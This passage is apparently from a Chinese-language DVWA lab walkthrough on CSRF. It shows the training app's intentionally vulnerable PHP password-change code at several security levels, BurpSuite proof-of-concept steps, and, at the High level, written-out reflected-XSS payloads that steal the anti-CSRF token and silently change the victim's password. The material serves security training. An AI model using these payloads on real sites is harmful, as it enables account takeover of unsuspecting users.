punctuation">.</span> <span class="token function">dvwaCurrentUser</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token string">"';"</span><span class="token punctuation">;</span>        <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">mysqli_query</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>  <span class="token variable">$insert</span> <span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token keyword">die</span><span class="token punctuation">(</span> <span class="token string">'&lt;pre>'</span> <span class="token punctuation">.</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">is_object</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token function">mysqli_error</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$___mysqli_res</span> <span class="token operator">=</span> <span class="token function">mysqli_connect_error</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token variable">$___mysqli_res</span> <span class="token punctuation">:</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token string">'&lt;/pre>'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// Feedback for the user</span>        <span class="token keyword">echo</span> <span class="token string">"&lt;pre>Password Changed.&lt;/pre>"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">else</span> <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">// Issue with passwords matching</span>        <span class="token keyword">echo</span> <span class="token string">"&lt;pre>Passwords did not match.&lt;/pre>"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">is_null</span><span class="token punctuation">(</span><span class="token variable">$___mysqli_res</span> <span class="token operator">=</span> <span class="token function">mysqli_close</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token boolean">false</span> <span class="token punctuation">:</span> <span class="token variable">$___mysqli_res</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?></span> </code></pre><ul><li>修改密码过程针对第三方站点自动化请求无任何防御机制，可以在用户登录状态下由第三方站点自动发起修改密码操作。</li></ul><p><strong>漏洞利用</strong>：</p><ul><li>启动BurpSuite并对Proxy-Options进行设置。</li></ul><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/TargetDrone/DVWA/LabManual/Proxy-Option设置.png" alt="Proxy-Option设置"></center><ul><li>启动FireFox浏览器并将其代理设置为<code>127.0.0.1:8080</code>。</li></ul><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/TargetDrone/DVWA/LabManual/FireFox代理设置.png" alt="FireFox代理设置"></center><ul><li>暂时关闭BurpSuite代理拦截功能。</li></ul><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/TargetDrone/DVWA/LabManual/BP-Proxy-Off.png" alt="BP-Proxy-Off"></center><ul><li>在FireFox浏览器中发起一次密码修改请求。</li></ul><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/TargetDrone/DVWA/LabManual/PwdChange-Request.png" alt="PwdChange-Request"></center><ul><li>使用BurpSuite进行CSRF攻击。</li></ul><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/TargetDrone/DVWA/LabManual/csrf-POC.png" alt="csrf-POC"></center><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/TargetDrone/DVWA/LabManual/csrf-POC-修改参数.png" alt="csrf-POC-修改参数"></center><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/TargetDrone/DVWA/LabManual/csrf-POC-link.png" alt="csrf-POC-link"></center><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/TargetDrone/DVWA/LabManual/csrf.png" alt="csrf"></center><ul><li>CSRF-POC执行结果。</li></ul><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/TargetDrone/DVWA/LabManual/csrf-POC-result.png" alt="csrf-POC-result"></center><h2 id="Medium级别"><a href="#Medium级别" class="headerlink" title="Medium级别"></a>Medium级别</h2><p>​        设置 DVWA 安全级别为 Medium。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/TargetDrone/DVWA/LabManual/SecurityLevel_Medium.png" alt="SecurityLevel_Medium"></center><p><strong>服务器端核心代码</strong>：</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token function">isset</span><span class="token punctuation">(</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span> <span class="token string">'Change'</span> <span class="token punctuation">]</span> <span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">// Checks to see where the request came from</span>    <span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token function">stripos</span><span class="token punctuation">(</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span> <span class="token string">'HTTP_REFERER'</span> <span class="token punctuation">]</span> <span class="token punctuation">,</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span> <span class="token string">'SERVER_NAME'</span> <span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token boolean">false</span> <span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">// Get input</span>        <span class="token variable">$pass_new</span>  <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span> <span class="token string">'password_new'</span> <span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$pass_conf</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span> <span class="token string">'password_conf'</span> <span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// Do the passwords match?</span>        <span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token variable">$pass_new</span> <span class="token operator">==</span> <span class="token variable">$pass_conf</span> <span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">// They do!</span>            <span class="token variable">$pass_new</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">is_object</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token function">mysqli_real_escape_string</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>  <span class="token variable">$pass_new</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">trigger_error</span><span class="token punctuation">(</span><span class="token string">"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work."</span><span class="token punctuation">,</span> <span class="token constant">E_USER_ERROR</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token string">""</span> <span class="token punctuation">:</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$pass_new</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span> <span class="token variable">$pass_new</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">// Update the database</span>            <span class="token variable">$insert</span> <span class="token operator">=</span> <span class="token string">"UPDATE `users` SET password = '$pass_new' WHERE user = '"</span> <span class="token punctuation">.</span> <span class="token function">dvwaCurrentUser</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token string">"';"</span><span class="token punctuation">;</span>            <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">mysqli_query</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>  <span class="token variable">$insert</span> <span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token keyword">die</span><span class="token punctuation">(</span> <span class="token string">'&lt;pre>'</span> <span class="token punctuation">.</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">is_object</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token function">mysqli_error</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$___mysqli_res</span> <span class="token operator">=</span> <span class="token function">mysqli_connect_error</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token variable">$___mysqli_res</span> <span class="token punctuation">:</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token string">'&lt;/pre>'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">// Feedback for the user</span>            <span class="token keyword">echo</span> <span class="token string">"&lt;pre>Password Changed.&lt;/pre>"</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">else</span> <span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">// Issue with passwords matching</span>            <span class="token keyword">echo</span> <span class="token string">"&lt;pre>Passwords did not match.&lt;/pre>"</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">else</span> <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">// Didn't come from a trusted source</span>        <span class="token keyword">echo</span> <span class="token string">"&lt;pre>That request didn't look correct.&lt;/pre>"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">is_null</span><span class="token punctuation">(</span><span class="token variable">$___mysqli_res</span> <span class="token operator">=</span> <span class="token function">mysqli_close</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token boolean">false</span> <span class="token punctuation">:</span> <span class="token variable">$___mysqli_res</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?></span> </code></pre><ul><li>针对请求来源使用 http referrer 头信息进行检查，但是检查逻辑存在问题，检查逻辑为在 referer 中查找服务器名称，若查找到则成功，否则失败。</li></ul><p><strong>漏洞利用：</strong></p><ul><li>启动BurpSuite并对Proxy-Options进行设置。</li></ul><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/TargetDrone/DVWA/LabManual/Proxy-Option设置.png" alt="Proxy-Option设置"></center><ul><li>启动FireFox浏览器并将其代理设置为<code>127.0.0.1:8080</code>。</li></ul><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/TargetDrone/DVWA/LabManual/FireFox代理设置.png" alt="FireFox代理设置"></center><ul><li>暂时关闭BurpSuite代理拦截功能。</li></ul><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/TargetDrone/DVWA/LabManual/BP-Proxy-Off.png" alt="BP-Proxy-Off"></center><ul><li>在FireFox浏览器中发起一次密码修改请求。</li></ul><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/TargetDrone/DVWA/LabManual/PwdChange-Request.png" alt="PwdChange-Request"></center><ul><li>使用BurpSuite进行CSRF攻击。</li></ul><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/TargetDrone/DVWA/LabManual/csrf-POC.png" alt="csrf-POC"></center><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/TargetDrone/DVWA/CSRF/csrf-POC-修改参数-copyhtml.png" alt="csrf-POC-修改参数-copyhtml"></center><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/TargetDrone/DVWA/CSRF/csrf-POC-html.png" alt="csrf-POC-html"></center><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/TargetDrone/DVWA/CSRF/csrf-POC-httpserver.png" alt="csrf-POC-httpserver"></center><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/TargetDrone/DVWA/CSRF/csrf-POC-subRequest.png" alt="csrf-POC-subRequest"></center><ul><li>CSRF-POC执行结果。</li></ul><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/TargetDrone/DVWA/LabManual/csrf-POC-result.png" alt="csrf-POC-result"></center><h2 id="High级别"><a href="#High级别" class="headerlink" title="High级别"></a>High级别</h2><p>​    设置 DVWA 安全级别为 High。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/TargetDrone/DVWA/LabManual/SecurityLevel_High.png" alt="SecurityLevel_High"></center><p><strong>服务器端核心代码</strong>：</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token function">isset</span><span class="token punctuation">(</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span> <span class="token string">'Change'</span> <span class="token punctuation">]</span> <span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">// Check Anti-CSRF token</span>    <span class="token function">checkToken</span><span class="token punctuation">(</span> <span class="token variable">$_REQUEST</span><span class="token punctuation">[</span> <span class="token string">'user_token'</span> <span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$_SESSION</span><span class="token punctuation">[</span> <span class="token string">'session_token'</span> <span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">'index.php'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// Get input</span>    <span class="token variable">$pass_new</span>  <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span> <span class="token string">'password_new'</span> <span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$pass_conf</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span> <span class="token string">'password_conf'</span> <span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// Do the passwords match?</span>    <span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token variable">$pass_new</span> <span class="token operator">==</span> <span class="token variable">$pass_conf</span> <span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">// They do!</span>        <span class="token variable">$pass_new</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">is_object</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token function">mysqli_real_escape_string</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>  <span class="token variable">$pass_new</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">trigger_error</span><span class="token punctuation">(</span><span class="token string">"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work."</span><span class="token punctuation">,</span> <span class="token constant">E_USER_ERROR</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token string">""</span> <span class="token punctuation">:</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$pass_new</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span> <span class="token variable">$pass_new</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// Update the database</span>        <span class="token variable">$insert</span> <span class="token operator">=</span> <span class="token string">"UPDATE `users` SET password = '$pass_new' WHERE user = '"</span> <span class="token punctuation">.</span> <span class="token function">dvwaCurrentUser</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token string">"';"</span><span class="token punctuation">;</span>        <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">mysqli_query</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>  <span class="token variable">$insert</span> <span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token keyword">die</span><span class="token punctuation">(</span> <span class="token string">'&lt;pre>'</span> <span class="token punctuation">.</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">is_object</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token function">mysqli_error</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$___mysqli_res</span> <span class="token operator">=</span> <span class="token function">mysqli_connect_error</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token variable">$___mysqli_res</span> <span class="token punctuation">:</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token string">'&lt;/pre>'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// Feedback for the user</span>        <span class="token keyword">echo</span> <span class="token string">"&lt;pre>Password Changed.&lt;/pre>"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">else</span> <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">// Issue with passwords matching</span>        <span class="token keyword">echo</span> <span class="token string">"&lt;pre>Passwords did not match.&lt;/pre>"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">is_null</span><span class="token punctuation">(</span><span class="token variable">$___mysqli_res</span> <span class="token operator">=</span> <span class="token function">mysqli_close</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token boolean">false</span> <span class="token punctuation">:</span> <span class="token variable">$___mysqli_res</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">// Generate Anti-CSRF token</span><span class="token function">generateSessionToken</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span> </code></pre><ul><li>针对请求进行随机 token 验证， 需要借助 xss 漏洞实现漏洞利用  </li></ul><p><strong>漏洞利用：</strong></p><ul><li><p>借助发射型XSS实现CSRF攻击。</p><ul><li>反射型XSS漏洞利用，payload：<code>&lt;img src=&quot;&quot; onerror=&quot;alert(/xss/)&quot;/&gt;</code></li></ul><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/TargetDrone/DVWA/CSRF/反射型XSS漏洞利用.png" alt="反射型XSS漏洞利用"></center><ul><li>通过反射型XSS获取修改密码表单<code>user_token</code>，payload：</li></ul><pre class=" language-javascript"><code class="language-javascript"><span class="token operator">&lt;</span>iframe src<span class="token operator">=</span><span class="token string">"../csrf/"</span>onload<span class="token operator">=</span><span class="token string">"alert(frames[0].document.getElementsByName('user_token')[0].value)"</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>iframe<span class="token operator">></span> </code></pre><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/TargetDrone/DVWA/CSRF/反射型XSS获取user_token.png" alt="反射型XSS获取user_token"></center><ul><li>利用反射型XSS自动提交修改密码表单，payload：</li></ul><pre class=" language-javascript"><code class="language-javascript"><span class="token operator">&lt;</span>iframe src<span class="token operator">=</span><span class="token string">"../csrf"</span> onload<span class="token operator">=</span>"<span class="token keyword">var</span> t<span class="token operator">=</span>frames<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>document<span class="token punctuation">.</span><span class="token function">getElementsByName</span><span class="token punctuation">(</span><span class="token string">'user_token'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>value<span class="token punctuation">,</span>x<span class="token operator">=</span><span class="token keyword">new</span><span class="token class-name">XMLHttpRequest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>x<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">'GET'</span><span class="token punctuation">,</span>'<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span>csrf<span class="token operator">/</span><span class="token operator">?</span>password_new<span class="token operator">=</span>test123<span class="token operator">&amp;</span>password_conf<span class="token operator">=</span>test123<span class="token operator">&amp;</span>Change<span class="token operator">=</span>Change<span class="token operator">&amp;</span>user_token<span class="token operator">=</span>'<span class="token operator">+</span>t<span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>x<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token punctuation">)</span>"<span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>iframe<span class="token operator">></span></code></pre><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/TargetDrone/DVWA/CSRF/csrf-xss-payload.png" alt="csrf-xss-payload"></center><ul><li>CSRF-XSS-Payload执行结果。</li></ul><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/TargetDrone/DVWA/CSRF/csrf-xss-payload-result.png" alt="csrf-xss-payload-result"></center></li></ul><h2 id="Impossible级别"><a href="#Impossible级别" class="headerlink" title="Impossible级别"></a>Impossible级别</h2><p>​        设置 DVWA 安全级别为 Impossible。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/TargetDrone/DVWA/LabManual/SecurityLevel_Impossible.png" alt="SecurityLevel_Impossible"></center><p><strong>服务器端核心代码</strong>：</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token function">isset</span><span class="token punctuation">(</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span> <span class="token string">'Change'</span> <span class="token punctuation">]</span> <span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">// Check Anti-CSRF token</span>    <span class="token function">checkToken</span><span class="token punctuation">(</span> <span class="token variable">$_REQUEST</span><span class="token punctuation">[</span> <span class="token string">'user_token'</span> <span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$_SESSION</span><span class="token punctuation">[</span> <span class="token string">'session_token'</span> <span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">'index.php'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// Get input</span>    <span class="token variable">$pass_curr</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span> <span class="token string">'password_current'</span> <span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$pass_new</span>  <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span> <span class="token string">'password_new'</span> <span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$pass_conf</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span> <span class="token string">'password_conf'</span> <span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// Sanitise current password input</span>    <span class="token variable">$pass_curr</span> <span class="token operator">=</span> <span class="token function">stripslashes</span><span class="token punctuation">(</span> <span class="token variable">$pass_curr</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$pass_curr</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">is_object</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token function">mysqli_real_escape_string</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>  <span class="token variable">$pass_curr</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">trigger_error</span><span class="token punctuation">(</span><span class="token string">"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work."</span><span class="token punctuation">,</span> <span class="token constant">E_USER_ERROR</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token string">""</span> <span class="token punctuation">:</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$pass_curr</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span> <span class="token variable">$pass_curr</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// Check that the current password is correct</span>    <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token variable">$db</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">prepare</span><span class="token punctuation">(</span> <span class="token string">'SELECT password FROM users WHERE user = (:user) AND password = (:password) LIMIT 1;'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$data</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">bindParam</span><span class="token punctuation">(</span> <span class="token string">':user'</span><span class="token punctuation">,</span> <span class="token function">dvwaCurrentUser</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token constant">PDO</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token constant">PARAM_STR</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$data</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">bindParam</span><span class="token punctuation">(</span> <span class="token string">':password'</span><span class="token punctuation">,</span> <span class="token variable">$pass_curr</span><span class="token punctuation">,</span> <span class="token constant">PDO</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token constant">PARAM_STR</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$data</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// Do both new passwords match and does the current password match the user?</span>    <span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token punctuation">(</span> <span class="token variable">$pass_new</span> <span class="token operator">==</span> <span class="token variable">$pass_conf</span> <span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span> <span class="token variable">$data</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">rowCount</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">1</span> <span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">// It does!</span>        <span class="token variable">$pass_new</span> <span class="token operator">=</span> <span class="token function">stripslashes</span><span class="token punctuation">(</span> <span class="token variable">$pass_new</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token 